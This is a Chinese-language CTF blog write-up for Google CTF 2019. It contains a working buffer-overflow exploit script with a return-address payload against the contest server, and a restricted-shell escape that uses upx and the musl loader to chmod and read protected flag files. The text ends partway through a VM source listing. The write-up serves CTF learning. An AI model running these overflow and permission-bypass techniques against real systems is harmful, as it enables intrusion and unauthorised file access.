---
title: goolge ctf 2019 stage1 writeup_part_2
date: 2019-10-02 12:45:43
tags:
- ctf
categories:
- [ctf]
---

## 05 STOP GAN(pwn)

- 提供buffer-overflow.ctfcompetition.com 1337
- 下载文件解压得到bof and console.c

```sh
╭─r10@GSCR10 /mnt/c/Users/R10/Desktop/google ctf/ctf/04_STOP GAN
╰─➤  file bof console.c
bof:       ELF 32-bit LSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=a31c48679f10dc6945e7b5e3a88b979bebe752e3, not stripped
console.c: C source, ASCII text
```

- 查看console.c,可以理解此程序可以crash bof 得到1st flag,进一步进行缓冲区溢出可以得到2nd flag

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

/**
 * 6e: bufferflow triggering segfault  - binary, compile with:
 * gcc /tmp/console.c -o /tmp/console -static -s
 *
 * Console allows the player to get info on the binary.
 * Crashing bof will trigger the 1st flag.
 * Controlling the buffer overflow in bof will trigger the 2nd flag.
 */

int main() {
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  setbuf(stderr, NULL);
  char inputs[256];
  printf("Your goal: try to crash the Cauliflower system by providing input to the program which is launched by using 'run' command.\n Bonus flag for controlling the crash.\n");
  while(1) {
    printf("\nConsole commands: \nrun\nquit\n>>");
    if (fgets(inputs, 256, stdin) == NULL) {
      exit(0);
    }
    printf("Inputs: %s", inputs);
    if ( strncmp(inputs, "run\n\0", 256) == 0 ) {
      int result = system("/usr/bin/qemu-mipsel-static ./bof");
      continue;
    } else if ( strncmp(inputs, "quit\n\0", 256) == 0 ) {
      exit(0);
    } else {
      puts("Unable to determine action from your input");
      exit(0);
    }
  }
  return 0;
}
```

- 编译console.c 得到console（由于/usr/bin/qemu-mipsel-static: not found，程序无法正常执行。此问题原因后续研究）

```bash
➜ 04_STOP GAN gcc console.c -o console -static -s
➜ 04_STOP GAN ./console
Your goal: try to crash the Cauliflower system by providing input to the program which is launched by using 'run' command.
 Bonus flag for controlling the crash.

Console commands:
run
quit
>>run
Inputs: run
sh: 1: /usr/bin/qemu-mipsel-static: not found

Console commands:
run
quit
>>
```

- 利用netcat连接给定的网址，可运行远程console

```sh
➜ 04_STOP GAN nc -v buffer-overflow.ctfcompetition.com 1337
Connection to buffer-overflow.ctfcompetition.com 1337 port [tcp/*] succeeded!
Your goal: try to crash the Cauliflower system by providing input to the program which is laun
ched by using 'run' command.
 Bonus flag for controlling the crash.
Console commands:
run
quit
>>run
Inputs: run
aaaaaaaaaaaaaaaaaaa
Cauliflower systems never crash >>
```

- 由于长度没有达到溢出要求，可以看到随意一串字符串并没有带来crash
- 利用python生成长字符串达成crash

```sh
╭─r10@GSCR10 /mnt/c/Users/R10/Desktop/google ctf/ctf/04_STOP GAN
╰─➤   python3 -c "print ('run\n' + 'a'*268)" | nc buffer-overflow.ctfcompetition.com 1337
Your goal: try to crash the Cauliflower system by providing input to the program which is launched by using 'run' command.
 Bonus flag for controlling the crash.

Console commands:
run
quit
>>Inputs: run
CTF{Why_does_cauliflower_threaten_us}
Cauliflower systems never crash >>
segfault detected! ***CRASH***
Console commands:
run
quit
>>
```

- ==**1st flag:CTF{Why_does_cauliflower_threaten_us}**==
- 为了得到2ed flag， need Controlling the buffer overflow in bof
- 找到local_flag function(利用IDA逆向工具也可查看到此函数)，地址范围0x400840-0x400890

```sh
╭─r10@GSCR10 /mnt/c/Users/R10/Desktop/google ctf/ctf/04_STOP GAN
╰─➤  nm bof | grep "flag"
0049ffc0 D _dl_stack_flags
00400840 t local_flag
```

- 当长度为265时,程序爆出提示，说明指针进行了一次跳转

```sh
╭─r10@GSCR10 /mnt/c/Users/R10/Desktop/google ctf/ctf/04_STOP GAN
╰─➤  python3 -c "print ('run\n' + 'a'*265)" | nc buffer-overflow.ctfcompetition.com 1337
Your goal: try to crash the Cauliflower system by providing input to the program which is launched by using 'run' command.
 Bonus flag for controlling the crash.

Console commands:
run
quit
>>Inputs: run
qemu: uncaught target signal 4 (Illegal instruction) - core dumped
Illegal instruction (core dumped)
```

- 通过实验得到：offset为264字节的填充字符串，加上4字节返回地址，可以将返回指针设定到local_flag函数地址0x400850(对于MIPS的指令调试不熟悉，但buffer-overflow的原理类似，可以参见<https://ctftime.org/writeup/15933讲解)，可以在local_flag地址范围内一次尝试>
- 编写exlpoit.py

```python
#!/usr/bin/env python3

import socket
import time
def main():
        padding = "\x41" * 264
        address = "\x50\x08\x40"
        payload = padding + address + "\n"
        with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as soc:
                soc.connect(("buffer-overflow.ctfcompetition.com",1337))
                time.sleep(1)
                soc.recv(1024)
                soc.send("run\n".encode())
                soc.send(payload.encode())
                time.sleep(1)
                print(soc.recv(1024).decode("utf-8"))
if __name__ == "__main__":
        main()
```

```bash
╭─r10@GSCR10 /mnt/c/Users/R10/Desktop/google ctf/ctf/04_STOP GAN
╰─➤  ./exploit.py


Console commands:
run
quit
>>Inputs: run
CTF{controlled_crash_causes_conditional_correspondence}
Cauliflower systems never crash >>

╭─r10@GSCR10 /mnt/c/Users/R10/Desktop/google ctf/ctf/04_STOP GAN
╰─➤  python3 -c "print ('run\n' + 'a'*264 +'\x50\x08\x40')" | nc buffer-overflow.ctfcompetition.com 1337
Your goal: try to crash the Cauliflower system by providing input to the program which is launched by using 'run' command.
 Bonus flag for controlling the crash.

Console commands:
run
quit
>>Inputs: run
CTF{controlled_crash_causes_conditional_correspondence}
Cauliflower systems never crash >>
```

- ==**2nd flag:CTF{controlled_crash_causes_conditional_correspondence}**==

## 06 Work Computer(sandbox)

- netcat connect :readme.ctfcompetition.com 1337

```sh
╭─r10@GSCR10 /mnt/c/Users/R10/Desktop/google ctf/ctf/05_Work
╰─➤  nc readme.ctfcompetition.com 1337

> ls -al
total 12
drwxrwxrwt    2 0        0               80 Sep 20 14:05 .
drwxr-xr-x   20 0        0             4096 Jun 13 14:28 ..
----------    1 1338     1338            33 Sep 20 14:05 ORME.flag
-r--------    1 1338     1338            28 Sep 20 14:05 README.flag
> cat README.flag
error: No such file or directory
> more README.flag
error: No such file or directory
> vim README.flag
error: No such file or directory
>
```

- 发现命令均失效，查看/bin /sbin /usr/bin /usr/sbin,大部分命令均被busybox限制

```sh
> busybox
busybox can not be called for alien reasons.
```

```txt
[H[J



******************************************


	****ALIEN SHELL****



******************************************


USER is: @(null)
[H[J> total 808
drwxr-xr-x    2 65534    65534         4096 Jun 13 14:28 .
drwxr-xr-x   20 0        0             4096 Jun 13 14:28 ..
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 arch -> /bin/busybox
-rwxr-xr-x    1 65534    65534       796240 Jan 24  2019 busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 chgrp -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 chown -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 conspy -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 date -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 df -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 dmesg -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 dnsdomainname -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 dumpkmap -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 echo -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 false -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 fdflush -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 fsync -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 getopt -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 hostname -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 ionice -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 iostat -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 ipcalc -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 kill -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 login -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 ls -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 lzop -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 makemime -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 mkdir -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 mknod -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 mktemp -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 mount -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 mountpoint -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 mpstat -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 netstat -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 nice -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 pidof -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 ping -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 ping6 -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 pipe_progress -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 printenv -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 ps -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 pwd -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 reformime -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 rm -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 rmdir -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 run-parts -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 setpriv -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 setserial -> /bin/busybox
-r-sr-xr-x    1 1338     1338         19936 Jun 13 12:48 shell
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 sleep -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 stat -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 stty -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 sync -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 tar -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 true -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 umount -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 uname -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 usleep -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 watch -> /bin/busybox
> total 236
drwxr-xr-x    2 65534    65534         4096 May  9 20:49 .
drwxr-xr-x   20 0        0             4096 Jun 13 14:28 ..
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 acpid -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 adjtimex -> /bin/busybox
-rwxr-xr-x    1 65534    65534       211304 Jan 10  2019 apk
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 arp -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 blkid -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 blockdev -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 depmod -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 fbsplash -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 fdisk -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 findfs -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 fsck -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 fstrim -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 getty -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 halt -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 hdparm -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 hwclock -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 ifconfig -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 ifdown -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 ifenslave -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 ifup -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 init -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 inotifyd -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 insmod -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 ip -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 ipaddr -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 iplink -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 ipneigh -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 iproute -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 iprule -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 iptunnel -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 klogd -> /bin/busybox
-rwxr-xr-x    1 65534    65534          393 Mar 19  2019 ldconfig
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 loadkmap -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 logread -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 losetup -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 lsmod -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 mdev -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 mkdosfs -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 mkfs.vfat -> /bin/busybox
-rwxr-xr-x    1 65534    65534        13968 Jan 23  2019 mkmntdirs
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 mkswap -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 modinfo -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 modprobe -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 nameif -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 nologin -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 poweroff -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 raidautorun -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 reboot -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 rmmod -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 route -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 setconsole -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 slattach -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 swapoff -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 swapon -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 switch_root -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 sysctl -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 syslogd -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 tunctl -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 udhcpc -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 vconfig -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 watchdog -> /bin/busybox
> total 1992
drwxr-xr-x    2 65534    65534         4096 Jun 13 14:28 .
drwxr-xr-x    8 65534    65534         4096 Jun 13 14:28 ..
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 [ -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 [[ -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 basename -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 beep -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 blkdiscard -> /bin/busybox
-rwxr-xr-x    1 65534    65534        14208 Jan 29  2019 c_rehash
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 cal -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 chvt -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 cksum -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 clear -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 cpio -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 crontab -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 cryptpw -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 dc -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 deallocvt -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 dirname -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 dos2unix -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 du -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 eject -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 env -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 expr -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 factor -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 fallocate -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 flock -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 fold -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 free -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 fuser -> /bin/busybox
-rwxr-xr-x    1 65534    65534        36728 Mar 19  2019 getconf
-rwxr-xr-x    1 65534    65534        51912 Mar 19  2019 getent
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 groups -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 hostid -> /bin/busybox
-rwxr-xr-x    1 65534    65534        25216 Mar 19  2019 iconv
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 id -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 install -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 ipcrm -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 ipcs -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 killall -> /bin/busybox
lrwxrwxrwx    1 65534    65534           29 May  9 20:49 ldd -> ../../lib/ld-musl-x86_64.so.1
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 logger -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 lsof -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 lsusb -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 lzcat -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 lzma -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 lzopcat -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 md5sum -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 mesg -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 microcom -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 mkfifo -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 mkpasswd -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 nmeter -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 nohup -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 nproc -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 nsenter -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 nslookup -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 openvt -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 passwd -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 patch -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 pgrep -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 pkill -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 pmap -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 printf -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 pstree -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 pwdx -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 readlink -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 realpath -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 renice -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 reset -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 resize -> /bin/busybox
-rwxr-xr-x    1 65534    65534        83744 Nov 15  2018 scanelf
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 seq -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 setkeycodes -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 setsid -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 sha1sum -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 sha256sum -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 sha3sum -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 sha512sum -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 showkey -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 shred -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 shuf -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 smemcap -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 split -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 sum -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 test -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 time -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 timeout -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 top -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 truncate -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 tty -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 ttysize -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 udhcpc6 -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 unix2dos -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 unlink -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 unlzma -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 unlzop -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 unshare -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 unxz -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 uptime -> /bin/busybox
-rwxr-xr-x    1 65534    65534      1810232 Dec 28  2018 upx
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 vlock -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 volname -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 wc -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 which -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 whoami -> /bin/busybox
lrwxrwxrwx    1 65534    65534           12 May  9 20:49 yes -> /bin/busybox
> total 24
```

- iconv命令可以使用：iconv - convert text from one character encoding to another

```sh
> iconv README.flag
CTF{4ll_D474_5h4ll_B3_Fr33}
> iconv ORME.flag
iconv: ORME.flag: Permission denied
>
```

- 可以看到README.flag文件中的flag

- upx命令可用：upx - compress or expand executable files
- 利用upx从busybox提取chmod cat 

```sh
> upx -o /tmp/chmod /bin/busybox
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2018
UPX 3.95        Markus Oberhumer, Laszlo Molnar & John Reiser   Aug 26th 2018

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
    796240 ->    451332   56.68%   linux/amd64   chmod

Packed 1 file.
> upx -o /tmp/cat /bin/busybox
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2018
UPX 3.95        Markus Oberhumer, Laszlo Molnar & John Reiser   Aug 26th 2018

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
    796240 ->    451332   56.68%   linux/amd64   cat

Packed 1 file.

> /tmp/chmod 777 ORME.flag README.flag
> ls -al
total 12
drwxrwxrwt    2 0        0               80 Sep 20 14:22 .
drwxr-xr-x   20 0        0             4096 Jun 13 14:28 ..
-rwxrwxrwx    1 1338     1338            33 Sep 20 14:22 ORME.flag
-rwxrwxrwx    1 1338     1338            28 Sep 20 14:22 README.flag

> /tmp/cat ORME.flag README.flag
CTF{Th3r3_1s_4lw4y5_4N07h3r_W4y}
CTF{4ll_D474_5h4ll_B3_Fr33}
>
```

- 另一种思路：利用ld-musl-x86_64.so.1(/lib/ld-musl-x86_64.so.1 is in musl 0.9.15-1.This file is owned by root:root, with mode 0o777.It is a symlink to /lib/x86_64-linux-musl/libc.so)

```sh
> /lib/ld-musl-x86_64.so.1 /bin/busybox chmod 777 ORME.flag README.flag
> ls -al
total 12
drwxrwxrwt    2 0        0               80 Sep 20 15:48 .
drwxr-xr-x   20 0        0             4096 Jun 13 14:28 ..
-rwxrwxrwx    1 1338     1338            33 Sep 20 15:48 ORME.flag
-rwxrwxrwx    1 1338     1338            28 Sep 20 15:48 README.flag
> /lib/ld-musl-x86_64.so.1 /bin/busybox cat ORME.flag README.flag
CTF{Th3r3_1s_4lw4y5_4N07h3r_W4y}
CTF{4ll_D474_5h4ll_B3_Fr33}
```

- ==**flag:CTF{4ll_D474_5h4ll_B3_Fr33}**==
- ==**flag:CTF{Th3r3_1s_4lw4y5_4N07h3r_W4y}**==

## 07 FriendSpaceBookPlusAllAccessRedPremium.com(reversing)

- 解压得到：program  vm.py

```sh
╭─r10@GSCR10 /mnt/c/Users/R10/Desktop/google ctf/ctf/06_FriendSpaceBookPlusAllAccessRedPremium.com
╰─➤  file *                                                                                   06_FriendSpaceBookPlusAllAccessRedPremium.com.zip: Zip archive data, at least v2.0 to extract
program:                                           UTF-8 Unicode text
vm.py:                                             Python script, UTF-8 Unicode text executable
```

- vm.py

```py
import sys

# Implements a simple stack-based VM
class VM:

  def __init__(self, rom):
    self.rom = rom
    self.accumulator1 = 0
    self.accumulator2 = 0
    self.instruction_pointer = 1
    self.stack = []

  def step(self):
    cur_ins = self.rom[self.instruction_pointer]
    self.instruction_pointer += 1

    fn = VM.OPERATIONS.get(cur_ins, None)

    if cur_ins[0] == '🖋':
      return
    if fn is None:
      raise RuntimeError("Unknown instruction '{}' at {}".format(
          repr(cur_ins), self.instruction_pointer - 1))
    else:
      fn(self)

  def add(self):
    self.stack.append(self.stack.pop() + self.stack.pop())

  def sub(self):
    a = self.stack.pop()
    b = self.stack.pop()
    self.stack.append(b - a)

  def if_zero(self):
    if self.stack[-1] == 0:
      while self.rom[self.instruction_pointer] != '😐':
        if self.rom[self.instruction_pointer] in ['🏀', '⛰']:
          break
        self.step()
    else:
      self.find_first_endif()
      self.instruction_pointer += 1

  def if_not_zero(self):
    if self.stack[-1] != 0:
      while self.rom[self.instruction_pointer] != '😐':
        if self.rom[self.instruction_pointer] in ['🏀', '⛰']:
          break
        self.step()
    else:
      self.find_first_endif()
      self.instruction_pointer += 1

  def find_first_endif(self):
    while self.rom[self.instruction_pointer] != '😐':
      self.instruction_pointer += 1

  def jump_to(self):
    marker = self.rom[self.instruction_pointer]
    if marker[0] != '💰':
      print('Incorrect symbol : ' + marker[0])
      raise SystemExit()
    marker = '🖋' + marker[1:]
    self.instruction_pointer = self.rom.index(marker) + 1

  def jump_top(self):
    self.instruction_pointer = self.stack.pop()

  def exit(self):
    print('\nDone.')
    raise SystemExit()

  def print_top(self):
    sys.stdout.write(chr(self.stack.pop()))
